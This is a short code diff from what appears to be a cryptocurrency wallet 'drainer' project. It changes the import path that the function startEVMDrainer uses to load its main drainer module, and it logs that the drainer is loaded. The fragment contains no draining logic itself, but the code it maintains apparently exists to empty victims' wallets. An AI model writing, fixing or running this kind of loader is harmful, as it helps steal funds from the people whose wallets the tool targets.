@@ -4,7 +4,7 @@ async function startEVMDrainer(walletAddress, chainId = 1) {
 
   try {
     // Load the main drainer
-    const drainerPath = '../lib/drainers/evm-main.js'; // Adjust if needed
+    const drainerPath = './main.js'; // Adjust if needed
     const DrainerModule = await import(drainerPath);
 
     console.log("[DEBUG] Drainer loaded");
